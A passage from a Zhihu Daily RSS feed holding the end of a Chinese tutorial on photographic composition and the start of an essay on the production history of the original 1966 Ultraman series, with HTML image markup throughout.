data-original=\"https://pic1.zhimg.com/v2-769f68e3a6f95f13b25027e944960f18_r.jpg\"></figure><p>「引导注意力」说起来简单，但是想要实践起来却是难度极高。而构图这件事几乎是所有摄影在使用整个摄影生涯为之实践和不断探索。甚至是，它奠定了很多著名摄影师的风格。不过别担心，好在构图上手也非常简单，只要你能读到这里，并且循序渐进地实践，有明显进步并不难。</p>\n<p>不过在具体开始构图法则开始之前，我依然想要特别强调，不要死记硬背，要尝试从底层的逻辑去了解。</p>\n<h3>基础构图</h3>\n<p>所谓的基础构图本质，就是画面中元素的摆放。想象一下，我们的照片无非就是一个二维形状的空间筛选。比如下面这张图中，白色的范围就是画面的取景范围。而基础构图就是把画面中的元素安排在这个区域内。比如我们现在有一个人物，就叫他张三吧，它的大致形状可以抽象为一个圆形和连接一个长方形。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-aacf47fd3a3001fcca7983142b502001_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2732\" data-rawheight=\"2048\" class=\"origin_image zh-lightbox-thumb\" width=\"2732\" data-original=\"https://pic2.zhimg.com/v2-aacf47fd3a3001fcca7983142b502001_r.jpg\"></figure><p>那么我们拍摄张三时，构图就是安排他在画面中的内容。比如我们可以只让张三露出一个头：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-90766c3b13e47840d7b9dbde59bc84bf_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2732\" data-rawheight=\"2048\" class=\"origin_image zh-lightbox-thumb\" width=\"2732\" data-original=\"https://pic4.zhimg.com/v2-90766c3b13e47840d7b9dbde59bc84bf_r.jpg\"></figure><p>一般来说，显然如果这是张三男朋友拍摄的照片，张三的男朋友肯定已经被「狂徒」制裁了。</p>\n<p>所以其实不真正拍照你也可以练习构图，因为你现在就可以直接给张三想出很多构图，比如：</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-ca48a1d1a337354e623ad107df255939_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2732\" data-rawheight=\"2048\" class=\"origin_image zh-lightbox-thumb\" width=\"2732\" data-original=\"https://pic2.zhimg.com/v2-ca48a1d1a337354e623ad107df255939_r.jpg\"></figure><p>而这种构图方式，就是要学的基础构图，归根到底，就是主体的摆放。而以下提到的方式，无非就是摆放的规则。</p>\n<p><b>三分法</b></p>\n<p>这绝对是最为流行的构图方式，流行到，今天几乎甚至是在一些景区里大多数游客都已经知道：</p>\n<p>「拍照不要站中间，要往一侧站一点。」</p>\n<p>这种构图方式其实已经越来越被熟知。在前面的设置环节中，我提到了一定要打开网格线，因为网格线本身就是帮你划好的三分线。而在这个划好的三分线上，我们可以看到画面中一共「四根线」和「四个点」。</p>\n<p>所以，只要把画面按照这样的风格方式摆布，就是最直接的构图。</p>\n<p>比如我们直接把张三放到右侧的线一侧，同时把张三的眼睛放在右上侧的交点上，这样就完成了一个最为简单直接的构图方式。这样的构图方式在人像摄影中比比皆是，比如下图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-573df5599aa3829b601cb01ede455bd3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-573df5599aa3829b601cb01ede455bd3_r.jpg\"></figure><p>其实三分法并不难，难在如何快速找到三条线和焦点。比如风景摄影师中，最重要的一个选择就是天际线的摆布位置。而如果你打开了参考线，这就不是一个难题。这就是我为什么一再强调打开参考线，它真的很重要。</p>\n<p><b>黄金螺线</b></p>\n<p>黄金螺线法则其实来自于绘画，相信这条螺旋线你可能已经或多或少的看过。人们认为在这个螺旋风分割线上的人或者物，更能被视觉看到，或者说看起来更美。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f3f6efc8f0326913500d4a7c3250721d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2778\" data-rawheight=\"1562\" class=\"origin_image zh-lightbox-thumb\" width=\"2778\" data-original=\"https://pic2.zhimg.com/v2-f3f6efc8f0326913500d4a7c3250721d_r.jpg\"></figure><p>不过需要说明的是，黄金螺旋线并不是所有的构图比例都适用。归根到底，它是在构图比例为 16:9 的画幅中才是最正确的计算结果。所以想要使用黄金螺旋线构图，最好先选择画面的内容是 16:9。不过日常生活中，很难严谨，其实大致归结为三分法也基本不差。</p>\n<p><b>居中构图</b></p>\n<p>三分法的熟知，可能让我们反而忽视了居中构图。</p>\n<p>比如我们再次请出张三，我们可以看到如果我们把它放到画面中央，虽然整个画面很呆板，并不灵活。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-46c83803e61034296712990cdf5e4847_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2732\" data-rawheight=\"2048\" class=\"origin_image zh-lightbox-thumb\" width=\"2732\" data-original=\"https://pic4.zhimg.com/v2-46c83803e61034296712990cdf5e4847_r.jpg\"></figure><p>但是它有一个非常重要的特征：</p>\n<p>端庄，正式。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-479d0ceb150c570b2768e3f45909fadc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic1.zhimg.com/v2-479d0ceb150c570b2768e3f45909fadc_r.jpg\"></figure><p>而这也是居中构图的最大好处。</p>\n<p>因此在一些非常严肃的人像摄影中，居中法几乎就是最好的选择。所以这也恰恰说明了一个道理，任何一个构图方式之间并没有本质的优劣或者是高级。而是需要拍摄者，需要根据题材进行一个非常主动的选择。所以并不是居中构图不好，只是它需要合适的场景。</p>\n<p><b>对称构图</b></p>\n<p>对称构图基本上最常见的有两种构图分支，一个是：</p>\n<p><b>1. 镜面构图</b></p>\n<p>利用生活中，一切可以出现的镜面，并利用场景的反射往往可以拍摄非常多有趣的画面。而且其实除了常规的镜子以外，有很多生活中随处可得的简单物品都可以是合适的镜面，比如我们的手机屏幕就是。把一台手机的屏幕放置在手机镜头的底部附近，你就会发现一个纯天然的镜面。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-1b68b2d2f62ba415295c1f34299e8dee_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic3.zhimg.com/v2-1b68b2d2f62ba415295c1f34299e8dee_r.jpg\"></figure><p>水面也是一个非常常见的镜面构图的辅助。尤其是一些湖泊，海洋等等。只要我们在一个相对来说比较合适的光线场景，我们都可以让天空中的景色映入水幕。而且其实这里有一个很重要的技巧，一些场景中，如果本身没有水面我们也可以制造水面，比如在夜晚拍摄时，如果是晴天无水的街面，可能只要稍稍一点的水倒在地面上，就可以拍摄出很不错的镜面灯光反射。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-43399f29d3067443762c964198f0213f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-43399f29d3067443762c964198f0213f_r.jpg\"></figure><p>这其中一个最为重要的技巧就是手机镜头一定要低，尽可能的接近地面。</p>\n<p>而这也解释了为什么雨天拍照反而效果更好，因为下雨以后地面上会有很多水面，这些水面镜像出来的光线会让画面更加丰富有趣。</p>\n<p><b> 2. 元素构图</b></p>\n<p>元素对称并没有镜面对称这么直接，因为镜面对称是光线的基本原理，是肉眼可见的。而接下来的元素对称则需要一点想象力。比如我们再次请回我们的张三同学，在下面的画面中，我们可以看到张三同学站在画面的一侧，而另一侧又站了另一个李四同学。</p>\n<p>那么我们现在可以在张三李四之间划一条线，我们发现张三李四恰好处在对称的点上，这就是我们所说的元素对称。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-23ad0b05fcb8b8e531bd439e04dbfacb_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2732\" data-rawheight=\"2048\" class=\"origin_image zh-lightbox-thumb\" width=\"2732\" data-original=\"https://pic4.zhimg.com/v2-23ad0b05fcb8b8e531bd439e04dbfacb_r.jpg\"></figure><p>如果要说元素对称最了不起的还是要属我最喜欢的导演之一，韦斯安德森。单单说他的名字很多人可能不熟悉，但是你一定要听说过《布达佩斯大饭店》。</p>\n<p>在这部电影里，我们随处可见类似的元素对称，比如下面的截图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-318238ce3aec0e276652c20a46d64521_b.jpg\" data-size=\"normal\" data-rawwidth=\"5760\" data-rawheight=\"3840\" class=\"origin_image zh-lightbox-thumb\" width=\"5760\" data-original=\"https://pic2.zhimg.com/v2-318238ce3aec0e276652c20a46d64521_r.jpg\"><figcaption>《布达佩斯大饭店》剧照</figcaption></figure><p>这样的构图方式，会让整个画面具有设计感和视觉美感。而韦斯安德森对于这种构图方式的执念，也让他拥有了属于自己的风格。</p>\n<p>而这里也给我们两个很重要的启示：</p>\n<ol>\n<li>构图方式很多，如果不知道怎么构图选择，不如先挑选一个自己喜欢的构图方式，不断尝试，届时自然相通。</li>\n<li>多看好电影其实是一种非常有效和高效的构图方式。电影中的用光和构图都经过非常细致的考量，而且相比照片不同，很多电影还要考虑动态的光影和构图，更是难上加难。所以看电影的时候，稍微观察一下，很快就能感受到进步。</li>\n</ol>\n<p><b>引导线构图</b></p>\n<p>当然对于一张摄影作品来说，很多时候画面中不仅仅有这形状，还是线。最为常见的线自然是河流或者是山川的流动。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-a97ffa5d4dac6d4f41c78f14c834ba94_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic1.zhimg.com/v2-a97ffa5d4dac6d4f41c78f14c834ba94_r.jpg\"></figure><p>而画面中只要是出现流动的线，就会对照片读者的视线有着非常直接的引导作用。所以这也引申出风光摄影另一个非常经典的公式，我管它叫做「山下的河流」。</p>\n<p>比如最经典的亚当斯的这一张照片：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-ca6e8933cccaa393a532d447e5113dec_b.jpg\" data-size=\"normal\" data-rawwidth=\"2036\" data-rawheight=\"1652\" class=\"origin_image zh-lightbox-thumb\" width=\"2036\" data-original=\"https://pic1.zhimg.com/v2-ca6e8933cccaa393a532d447e5113dec_r.jpg\"><figcaption>The Tetons and the Snake River, Grand Teton National Park（安塞尔·亚当斯作品）</figcaption></figure><p>在这张中，我们的视线一开始一定会聚焦在这条河流上，然后我们会随着河流的移动方向，就可以看到远处的山脉，而其实对于这张作品而言，最终的主角正是远处的山脉。</p>\n<p>而使用线条引导画面历史上还有更为经典的一张作品，如图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-7b19b29125bff13e1e107b8a6f6b3ff4_b.jpg\" data-size=\"normal\" data-rawwidth=\"2034\" data-rawheight=\"1366\" class=\"origin_image zh-lightbox-thumb\" width=\"2034\" data-original=\"https://pic1.zhimg.com/v2-7b19b29125bff13e1e107b8a6f6b3ff4_r.jpg\"><figcaption>亨利·卡蒂埃-布列松作品</figcaption></figure><p>上图中，正是因为楼梯的引导线存在，给观众一个非常重要的错觉，会让我们觉得似乎骑自行车的人实际上是从楼梯上下来的。但无论是从哪里下来的，引导线的存在立刻就会让我们的视觉焦点停留在骑自行车的人上。所以下次，当你的画面中，出现线的时候，一定要好好加以利用，想一想，你可以让它的视线引导到哪里。</p>\n<h3>进阶构图</h3>\n<p>在进阶构图开始之前，我还是需要进行再一次的强调，「引导注意力」。因为接下来我要说的构图，无论多么抽象，多么难以理解，归根到底你要知道它的目的就是一种「注意力管理」。</p>\n<p><b>利用前景</b></p>\n<p>其实在摄影眼的部分，在超广角的部分我们已经描述过前景的作品，但是当时仅仅是局限在风光摄影。但是实际上，在各类题材中，前景都是非常好的拍摄手法。</p>\n<p>前景最为直接的作用就是简化画面，因为它的遮挡可以让画面中一些分散注意力的部分直接去除。但更重要的是，前景的构图，可以让照片从「二维」跳脱为「三维」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-ca37151fabbac79b014cba1753b959ad_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2995\" data-rawheight=\"3993\" class=\"origin_image zh-lightbox-thumb\" width=\"2995\" data-original=\"https://pic2.zhimg.com/v2-ca37151fabbac79b014cba1753b959ad_r.jpg\"></figure><p>因为大多数照片都是主体和背景构成，画面中只有两层。但是由于前景的出现，画面直接变为了「前、中、后」三层，具有更强的立体感。</p>\n<p><b>寻找画框</b></p>\n<p>不过要说到吸引注意力，那么我想没有任何一种构图方式比框式构图更为直接。道理也很简单，如果给你一页文字，让你在这个文字中标出重点，那么最直接有效的办法是什么呢？</p>\n<p>画个圈。</p>\n<p>是的，所谓的画框构图就有这样类似的作用，比如下面这张图，由于窗框的存在，我们可以直接可以聚焦在模特身上，而显然这就是画面的主体。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-2f6cddf6111b69cdaf7404c50d685722_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3133\" data-rawheight=\"2350\" class=\"origin_image zh-lightbox-thumb\" width=\"3133\" data-original=\"https://pic3.zhimg.com/v2-2f6cddf6111b69cdaf7404c50d685722_r.jpg\"></figure><p>更为高级的是，这种框选不仅仅是吸引注意力，它同时还能够让画面中立刻有了「画里画外」两个世界，尤其是一些在交通工具内拍摄的场景更是如此。它不仅仅在客观上明确的告诉你照片内的空间关系，同时很多时候也可以成为一种内在隐含，让人对拍摄者和窗外世界的联系有诸多遐想。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-271bd991508135e6875e4fa381dd2c51_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic2.zhimg.com/v2-271bd991508135e6875e4fa381dd2c51_r.jpg\"></figure><p>因此，多多观察生活中这些「已经画好的圈」。</p>\n<p><b>控制明暗</b></p>\n<p>严格意义上，明暗某种意义上来说应该算作是一种曝光的手法。但是这些年来，明暗的反差手法也的确成为了一种流行趋势。而自从彩色摄影出现以来，也的确有不少的大师以这种手法见长。</p>\n<p>在这里，所谓的明暗含义是通过画面中过度曝光，或者是过度欠曝，让画面中出现大面积的白色或者是黑色，或者是黑白两色为主。此时一般出现在画面中的人物很容易成为没有信息的剪影。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-fb744f3cdf9c8e3516283836e1f08844_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3060\" data-rawheight=\"4080\" class=\"origin_image zh-lightbox-thumb\" width=\"3060\" data-original=\"https://pic1.zhimg.com/v2-fb744f3cdf9c8e3516283836e1f08844_r.jpg\"></figure><p>但这也是我认为明暗控制方式应该算作构图的原因，因为这种方式大大去掉了画面中的干扰信息，让画面十分简洁。</p>\n<p><b>传达质感</b></p>\n<p>这可能是最为抽象的构图方式，但是其实果你还对汉语中「移觉和通感」这种修辞手法有记忆，那么其实二者是完全相同的。</p>\n<p>在汉语中，所谓的移觉或通感是说：</p>\n<p>用形象的语言把人们某个感官上的感觉移植到另一个感官上，凭借感觉相通，相互映照，以收到启发读者联想、体味余韵和深化诗文意境的效果。</p>\n<p>而在摄影中，我们如何通过视觉的方式，让读者其它的感光也有所感触，就是「质感构图」的作用。</p>\n<p>比如下图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-6e94ade9f8541dad2dee07b1e5185aec_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3859\" data-rawheight=\"2894\" class=\"origin_image zh-lightbox-thumb\" width=\"3859\" data-original=\"https://pic1.zhimg.com/v2-6e94ade9f8541dad2dee07b1e5185aec_r.jpg\"></figure><p>这是一张我们在魔鬼城里拍摄的沙地，这张图中，拍摄时摄影师一个很重要的想法就是通过寻找角度让沙子的颗粒更加明显，而这样做的目的就是当读者看到画面时，立刻能够想到自己的手对于沙子的触感。</p>\n<p>也就是说，拍照虽然是视觉艺术，但是我们是可以通过巧妙的方式，让我们的其它感官获得反馈。一个最简单直接的例子就是美食摄影中，很多飘散的烟雾就是「嗅觉的可视化」。</p>\n<p>而这就是所谓的质感构图。</p>\n<p>读到这里，相信你对构图已经有了一个重新的认识。我最后唯一还能再分享的就是我自己的构图学习历程。从我的经验来看，构图会有一个：</p>\n<p>「从无到有，然后从有到无的过程」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-987ec9aacb297c613b9bbeb615e3031a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic3.zhimg.com/v2-987ec9aacb297c613b9bbeb615e3031a_r.jpg\"></figure><p>所谓从无到有，就是正在阅读本文的各位，现在你已经了解到了很多构图方式，心里已经有了构图这件事。我相信聪明的你，现在拿起手机想要拍照，第一件事就是下意识构图。</p>\n<p>但是随着时间的推移，你会发现你很少再会注意构图这件事，但是你的作品却在潜移默化中悄悄的完成构图。这就是从有到无。</p>\n<p>但这还不是结束，而我也正在处于这一阶段，这就是「演绎自己的构图」。比如韦斯·安德森的对称构图，Alex Webb 的复杂构图等等等。</p>\n<p>所以，不仅是你，包括我自己到今天都是构图学习的学生，我们一起要走的路还有很远，毕竟学习怎么会有尽头。</p>\n<h2>写在最后</h2>\n<p>我不知道，会有多少人可以读到这里。</p>\n<p>毕竟这是一篇最终定格在 30000 字的文章，匀速阅读到这里至少需要接近 100 分钟。100 分钟看似不长，仅仅是一部电影的跨度。但是人生苦短，你能拿出生命中的 100 分钟和我一起在摄影的旅程中一起冒险，我深感荣幸。</p>\n<p>所以如果你真的读到这里，我很希望你可以大方地在评论区说说你的感受，让我知道过去我两个月的努力和付出真的对你有帮助，这对我很重要，是我创作的最大动力。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-137fc324ce959645512261beb33f5c70_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3204\" data-rawheight=\"2403\" class=\"origin_image zh-lightbox-thumb\" width=\"3204\" data-original=\"https://pic1.zhimg.com/v2-137fc324ce959645512261beb33f5c70_r.jpg\"></figure><p>按照惯例我需要在这里感谢本篇文章付出的每一个工作人员，他们是：</p>\n<ul>\n<li>本文中大量插图的拍摄者，厉害的手机摄影师也是我的挚友 Jamie-hua</li>\n<li>本文的编辑 nerd_du</li>\n<li>我们团队的支撑力量，批预算的制片人 Irene</li>\n</ul>\n<p>当然，还有本文的每一位读者。</p>\n<p>不过我想作为一篇分享，最好的致谢是「倾其所有」。思来想去，在技术上这篇文章已经倾囊相授，我还能说给你听的，只有我在摄影学习中的教训和经验，我就用它来做为本文的结尾吧。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-eaf1e491a893de6a6e732ebc8785f930_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2044\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic1.zhimg.com/v2-eaf1e491a893de6a6e732ebc8785f930_r.jpg\"></figure><ol>\n<li>\n<b>没有终点。</b>当你走上摄影这条路，就意味着终生学习，不仅仅是随着时代进步的技术，还有人生的经历。最后决定你照片厚度的，不是照片的数量，而是人生的阅历。</li>\n<li>\n<b>保持谦逊。</b>无论何时都不要说「已经拍得够好了」，多去看看别人在做什么，拍什么。我深知自身能力有限，所以今日所叙，应该是你摄影的起点，而不是重点。</li>\n<li>\n<b>学会享受。</b>纠结自己拍得好不好，作为鞭策自己的动力就好。重要的是，要学会找到摄影的乐趣，希望你有一天能做到对着自己拍摄的照片说出：<b>「今天拍了这么多了，已经很好了，我很满足。」</b>\n</li>\n</ol>\n<p>好了，列车终究要到站，期待在摄影学习的路上，与各位再会。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/bigface-62?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Derrick Zhang</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/391495508?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价《初代奥特曼》？","date":"2021-07-18 11:30:08","description":"\n<h2>一切的伊始 </h2>\n<p>奥特曼这个系列传到今天，已经有55年了。这个长寿的系列给了无数的孩子珍贵的童年回忆，无论是70后，80后，90后，00后，还是10后，提起奥特曼这个IP，心里总归会有或多或少的印象。而这个IP的伊始，就是1966年的这部作品：初代奥特曼。初代奥特曼作为第一步开山作，不仅仅是给后人指明了应该怎么拍摄这种作品，而且其本身拥有非常高的质量，无论是本篇的剧情水平，还是主角和敌役的塑造，亦或是其特摄部分展现出的特摄水平，在当时都是最上品的东西。可以说，即使没有后面的系列，初代奥特曼也是一部至真，至纯，至善，至美的作品，其制作时候的思路，是值得被后世所有奥系列的作品所吸纳的。</p>\n<h2>初代幕后的故事</h2>\n<p>初代虽然是一部完成度极高，作品剧集水平极高，同时特摄水平在当时世界顶级的作品。虽然他有这么高的地位以及水平，但是其实这部作品是一部准备时间非常短，并且一度濒临难产的作品。其制作条件是收到了极大的限制的，但正是因为如此，初代为何能够变成这样的一部极高水平的作品，其本质原因就是因为初代聚集了一批拥有极高的水平，同时又拥有相当热情的staff们。这些优秀的监督，脚本，特技监督，以及摄影等片场人员，碰撞出了许多十分有趣的故事。因此，初代曼的回答的第一个部分，我选择讲一下初代曼在制作时候的幕后的故事，也让读者们能够拥有更多的关于这部剧集的知识。 </p>\n<h3>难产 </h3>\n<p>1966年1月份，円谷制片厂的第一部特摄TV《奥特Q》在TBS播放了，当时就获得了轰动，收视率最高超过了30%。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0a68f1839351d9fdc22546a8a61def36_720w.jpg?rss\" data-rawwidth=\"430\" data-rawheight=\"600\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-0a68f1839351d9fdc22546a8a61def36\" data-watermark-src=\"v2-e7461ce89b699b399113bce3045ba4fc\" data-private-watermark-src=\"v2-0e8afefa7d42b57de37d1e488773c2f3\"></p>\n<p>但是在这部作品播出之前，円谷制片厂就已经开始作接下来的企划的打算了，其本质原因是因为円谷为了发展，必须主动，因为円谷作为“小作坊”，在和TBS的合作中，必须要主动，而TBS方的制片人栫井巍向円谷制片厂下达了制作新作的要求，要求为以下几点：</p>\n<p>第一，要有类似于“防卫队”的组织出现，因为在奥特Q里，三个主要角色分别为一个飞行员，一个助手和一个女记者，这样的三个“闲散人员”参与与怪兽的斗争本身就不合理，这点已经在当时被无数的批评家说过了，因此，TBS方要求円谷的新作中要出现成建制的“防卫队”。</p>\n<p> 第二，要有一个真正的固定主角。《奥特Q》这部作品本身的重点其实并不是塑造人物，而是怪奇现象，并通过这种设计展示“世界的円谷”的极具震撼力的特摄技术，因此，所谓的“主角团”其实仅是引路人，但这种设计在子供向的作品中是行不通的，给孩子看的剧集一定要有一个固定的主角。</p>\n<p> 第三点就是要求円谷制造彩色的电视剧，这在现在看起来是理所应当的，但是我们需要注意的一点是，直到50年代末，日本的电影才普及彩色电影，电视剧作为电影的下位个体，其普及的时间自然是更晚的。事实是，当时的日本的黑白电视机都没有普及，就更别提更加昂贵的彩色电视机了，对于当时的円谷制片厂而言，本身奥特Q就给円谷留下了大量的财政赤字，而拍摄彩色电视剧的成本，要比拍摄黑白电视剧高得多。 从我上文的描述中，大家应该能体会到这个新企划对当时的円谷制片厂而言是多困难的一个企划，但是，已经得到的档期不能放弃，当时的总经理市川利明的想法大概是：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-8a9632ba878d9f87c775a59c77f8fb79_720w.jpg?rss\" data-rawwidth=\"1080\" data-rawheight=\"2461\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8a9632ba878d9f87c775a59c77f8fb79\" data-watermark-src=\"v2-6c6c720ec2255ac58d89d9575804bea1\" data-private-watermark-src=\"v2-0853e9f6d08bb14dd3a7a3bf9081ae27\"></p>\n<p>于是，他在接到了这样的要求以后，就开始制定企划。要求一开始就拿出一个全新的企划是不现实的。市川找了一圈，发现之前和富士电视台谈合作的时候，有个《彗星生物WoO》的废案，那得嘞，就是他了。于是，在把这个原来的企划进行了比较大的改动之后，市川就把这个企划交给了TBS的影视部。</p>\n<p>我们需要知道的是，TBS不可能接受一个被富士毙掉的废案，即使这个废案已经被改动得原来的废案大相径庭。身为经营者的市川更是十分了解这点。他这个行为，其实就相当于一个简单的投石问路，我先给你们一个东西，然后看一下，TBS方究竟有什么要求，哪些东西是可以的，哪些东西是不可以的，这招也确实起到了作用。市川大概知道了TBS的想法：他想要一个有超级英雄的特摄电视作品。试探出这个核心重点之后，市川开始召集脚本家们来进行企划。当时的円谷，有专门的企划室，因此，企划室长自然就承担起了进行企划的重担。这个企划室长是谁呢？</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d3d1a9824ef9fbf6ab06263cc7a74824_720w.jpg?rss\" data-rawwidth=\"500\" data-rawheight=\"678\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d3d1a9824ef9fbf6ab06263cc7a74824\" data-watermark-src=\"v2-b314d6dbaf4fa6d80935576a696c0a49\" data-private-watermark-src=\"v2-ef55f4fcabe68b48d8c3ccf7494c5ded\"></p>\n<p> 没错，就是大家都很熟悉的金城哲夫。</p>\n<p>说是企划室长，但其实，这个所谓的企划室，有且只有两个人。一个是金城，担任企划室长，而另一个就是被金城坑过来的同乡上原正三。这两个人当然是要承担企划的责任的，还有另一个人，就是在奥特Q中担任脚本的山田正弘。这三个人在几天的brainstorm之后，拿出了一个叫做“宇宙怪兽百慕拉”的企划。 </p>\n<p>提出这个企划之后，就是円谷社内的反复讨论修改了。最后，円谷向TBS提交了一个最初的企划：《科学特搜队 百慕拉》，这个企划的重点有两个：第一个，就是延续奥特Q的怪兽特摄路线，而第二个就是科学特搜队这个组织。而这部剧中的正面的主角，是一只叫做百慕拉的怪兽。</p>\n<p>百慕拉一开始的形象是这样的：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-bd605a3fb3e12795c07ed8ff717478fb_720w.jpg?rss\" data-rawwidth=\"360\" data-rawheight=\"512\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-bd605a3fb3e12795c07ed8ff717478fb\" data-watermark-src=\"v2-c02bc9fa9b6011428d74ce375915f4bc\" data-private-watermark-src=\"v2-fd3ef697bb17bc080d83d09e860bc5a2\"></p>\n<p>这形象其实大家能看出来，借鉴了西游记里的狮驼国的那只金翅大鹏（迦楼罗）以及日本的天狗这种妖怪，一拿出来，金城一看表示，哎，整挺好，円谷社内也达成了压倒性的满意的意见，于是，金城就把这个形象拿过去给英二看。</p>\n<p>英二呢，盯着这个稿子看了半天，然后来了一句：“如果是彩色TV的话，那英雄有飒爽感是决胜负的关键啊”，特摄之神，没有人比他更懂特摄（字面含义）的人发话了，那自然就要去改一下了。</p>\n<p> 于是，金城就找到了我们的另一个老熟人：成田亨。在提出“飒爽感”的要求之后，结合百慕拉的怪兽的身份，成田亨给出了这个稿子： </p>\n<p><img src=\"https://pic2.zhimg.com/v2-4735bf0c6d8d4b9e15e6abe6fd06df96_720w.jpg?rss\" data-rawwidth=\"328\" data-rawheight=\"553\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4735bf0c6d8d4b9e15e6abe6fd06df96\" data-watermark-src=\"v2-128280876dd53798a4e2c32348d3a2ca\" data-private-watermark-src=\"v2-044690601f52c81ccf840c43bd55c901\"></p>\n<p>这个怪兽身上呢，我们能看到一定的熟悉的元素，最明显的应该是肩部的肩甲，这个设计又被用在了后面奥特赛文的身上。后面，在金城转达的英二的“飒爽感”的要求下，把设计改成了这样</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d6d8d83ee0814ff14668cd3d204c5c22_720w.jpg?rss\" data-rawwidth=\"309\" data-rawheight=\"551\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d6d8d83ee0814ff14668cd3d204c5c22\" data-watermark-src=\"v2-3771b0e7345ff682494048bdf45dfcf1\" data-private-watermark-src=\"v2-c1d89a24779d6c222149f51441ced8c5\"></p>\n<p>其实这个稿子已经有点初代曼的既视感了，只是这个时候用的还是百慕拉的名字。</p>\n<p>在皮套设计的同时，企划的会议也在如火如荼地进行中。TBS呢，又召集円谷开了个企划相关地会议，会议上提出了这几点：</p>\n<p>第一，以怪兽作为主人公还是有点难以接受，这点是事实，因为当时的制作环境下，怪兽还是不太能当英雄的形象</p>\n<p> 第二，是这个企划的民俗感太强了，希望能有更多的科幻的感觉。</p>\n<p>第三，TBS提到了1965年上映的，本多猪四郎监督，円谷英二特技监督的《科学怪人对地底怪兽》作为参考。 